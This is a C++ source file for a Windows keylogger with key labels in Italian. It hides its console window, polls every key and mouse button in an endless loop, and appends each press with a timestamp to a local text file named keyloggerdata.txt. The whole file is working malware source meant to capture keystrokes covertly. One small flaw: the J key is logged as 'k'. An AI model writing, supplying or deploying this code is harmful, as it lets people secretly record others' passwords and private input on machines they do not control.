#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <windows.h>
using namespace std;

string readfile()
{
    string oldcontent, oldcontentline;

    fstream datafile("keyloggerdata.txt");

    if (datafile.is_open())
    {
        while (datafile.good())
        {
            getline(datafile, oldcontentline);
            if (oldcontent.compare("") == 0)
            {
                oldcontent = oldcontentline;
            }
            else
            {

                oldcontent = oldcontent + "\n" + oldcontentline;
            }
        }
    }

    if (oldcontent.compare("") == 0)
    {
        fstream datafile{"keyloggerdata.txt", ios::out};
        datafile << "-- KEYLOGGER DATA --";
        oldcontent = "-- KEYLOGGER DATA --";
    }

    return oldcontent;
}

void updatefile(string input)
{
    string oldcontent = readfile();

    oldcontent = oldcontent + "\n";

    fstream datafile{"keyloggerdata.txt", ios::out};
    datafile << oldcontent << input;
}

void x(string input)
{
    time_t now = time(0);
    string date = ctime(&now);

    date.erase(24);

    input = input + " (" + date + ")";

    updatefile(input);
}

int main()
{
    // Hide Window
    HWND hwnd = GetConsoleWindow();

    ShowWindow(hwnd, SW_HIDE);

    while (true)
    {
        if (GetAsyncKeyState(0x01) & 1)
        {
            x("Pulsante Sinistro del Mouse");
        }
        if (GetAsyncKeyState(0x02) & 1)
        {
            x("Pulsante Destro del Mouse");
        }
        if (GetAsyncKeyState(0x04) & 1)
        {
            x("Tasto Centrale del Mouse");
        }
        if (GetAsyncKeyState(0x05) & 1)
        {
            x("Tasto Laterale 1 del Mouse");
        }
        if (GetAsyncKeyState(0x06) & 1)
        {
            x("Tasto Laterale 2 del mouse");
        }
        if (GetAsyncKeyState(0x08) & 1)
        {
            x("Cancella");
        }
        if (GetAsyncKeyState(0x09) & 1)
        {
            x("TAB");
        }
        if (GetAsyncKeyState(0x0D) & 1)
        {
            x("Invio");
        }
        if (GetAsyncKeyState(0x10) & 1)
        {
            x("Shift");
        }
        if (GetAsyncKeyState(0x11) & 1)
        {
            x("Control");
        }
        if (GetAsyncKeyState(0x12) & 1)
        {
            x("Alt");
        }
        if (GetAsyncKeyState(0x14) & 1)
        {
            x("Caps Lock");
        }
        if (GetAsyncKeyState(0x20) & 1)
        {
            x("Spazio");
        }
        if (GetAsyncKeyState(0x30) & 1)
        {
            x("0");
        }
        if (GetAsyncKeyState(0x31) & 1)
        {
            x("1");
        }
        if (GetAsyncKeyState(0x32) & 1)
        {
            x("2");
        }
        if (GetAsyncKeyState(0x33) & 1)
        {
            x("3");
        }
        if (GetAsyncKeyState(0x34) & 1)
        {
            x("4");
        }
        if (GetAsyncKeyState(0x35) & 1)
        {
            x("5");
        }
        if (GetAsyncKeyState(0x36) & 1)
        {
            x("6");
        }
        if (GetAsyncKeyState(0x37) & 1)
        {
            x("7");
        }
        if (GetAsyncKeyState(0x38) & 1)
        {
            x("8");
        }
        if (GetAsyncKeyState(0x39) & 1)
        {
            x("9");
        }
        if (GetAsyncKeyState(0x41) & 1)
        {
            x("a");
        }
        if (GetAsyncKeyState(0x42) & 1)
        {
            x("b");
        }
        if (GetAsyncKeyState(0x43) & 1)
        {
            x("c");
        }
        if (GetAsyncKeyState(0x44) & 1)
        {
            x("d");
        }
        if (GetAsyncKeyState(0x45) & 1)
        {
            x("e");
        }
        if (GetAsyncKeyState(0x46) & 1)
        {
            x("f");
        }
        if (GetAsyncKeyState(0x47) & 1)
        {
            x("g");
        }
        if (GetAsyncKeyState(0x48) & 1)
        {
            x("h");
        }
        if (GetAsyncKeyState(0x49) & 1)
        {
            x("i");
        }
        if (GetAsyncKeyState(0x4A) & 1)
        {
            x("k");
        }
        if (GetAsyncKeyState(0x4B) & 1)
        {
            x("k");
        }
        if (GetAsyncKeyState(0x4C) & 1)
        {
            x("l");
        }
        if (GetAsyncKeyState(0x4D) & 1)
        {
            x("m");
        }
        if (GetAsyncKeyState(0x4E) & 1)
        {
            x("n");
        }
        if (GetAsyncKeyState(0x4F) & 1)
        {
            x("o");
        }
        if (GetAsyncKeyState(0x50) & 1)
        {
            x("p");
        }
        if (GetAsyncKeyState(0x51) & 1)
        {
            x("q");
        }
        if (GetAsyncKeyState(0x52) & 1)
        {
            x("r");
        }
        if (GetAsyncKeyState(0x53) & 1)
        {
            x("s");
        }
        if (GetAsyncKeyState(0x54) & 1)
        {
            x("t");
        }
        if (GetAsyncKeyState(0x55) & 1)
        {
            x("u");
        }
        if (GetAsyncKeyState(0x56) & 1)
        {
            x("v");
        }
        if (GetAsyncKeyState(0x57) & 1)
        {
            x("w");
        }
        if (GetAsyncKeyState(0x58) & 1)
        {
            x("x");
        }
        if (GetAsyncKeyState(0x59) & 1)
        {
            x("y");
        }
        if (GetAsyncKeyState(0x5A) & 1)
        {
            x("z");
        }
        if (GetAsyncKeyState(0x5B) & 1)
        {
            x("Windows Sinistro");
        }
        if (GetAsyncKeyState(0x5C) & 1)
        {
            x("Windows Destro");
        }
        if (GetAsyncKeyState(0xBB) & 1)
        {
            x("+");
        }
        if (GetAsyncKeyState(0xBC) & 1)
        {
            x(",");
        }
        if (GetAsyncKeyState(0xBD) & 1)
        {
            x("-");
        }
        if (GetAsyncKeyState(0xBE) & 1)
        {
            x(".");
        }
        if (GetAsyncKeyState(0x1B) & 1)
        {
            x("ESC");
        }
        if (GetAsyncKeyState(0xE2) & 1)
        {
            x("<");
        }
        if (GetAsyncKeyState(0x70) & 1)
        {
            x("F1");
        }
        if (GetAsyncKeyState(0x71) & 1)
        {
            x("F2");
        }
        if (GetAsyncKeyState(0x72) & 1)
        {
            x("F3");
        }
        if (GetAsyncKeyState(0x73) & 1)
        {
            x("F4");
        }
        if (GetAsyncKeyState(0x74) & 1)
        {
            x("F5");
        }
        if (GetAsyncKeyState(0x75) & 1)
        {
            x("F6");
        }
        if (GetAsyncKeyState(0x76) & 1)
        {
            x("F7");
        }
        if (GetAsyncKeyState(0x77) & 1)
        {
            x("F8");
        }
        if (GetAsyncKeyState(0x78) & 1)
        {
            x("F9");
        }
        if (GetAsyncKeyState(0x79) & 1)
        {
            x("F10");
        }
        if (GetAsyncKeyState(0x7A) & 1)
        {
            x("F11");
        }
        if (GetAsyncKeyState(0x7B) & 1)
        {
            x("F12");
        }
        if (GetAsyncKeyState(0xDC) & 1)
        {
            x("\\");
        }
        if (GetAsyncKeyState(0xDE) & 1)
        {
            x("Virgolette singole/doppie");
        }

        if (GetAsyncKeyState(0x60) & 1)
        {
            x("0 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x61) & 1)
        {
            x("1 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x62) & 1)
        {
            x("2 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x63) & 1)
        {
            x("3 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x64) & 1)
        {
            x("4 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x65) & 1)
        {
            x("5 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x66) & 1)
        {
            x("6 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x67) & 1)
        {
            x("7 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x68) & 1)
        {
            x("8 (Tastierino Numerico)");
        }
        if (GetAsyncKeyState(0x69) & 1)
        {
            x("9 (Tastierino Numerico)");
        }
    }
    return 0;
}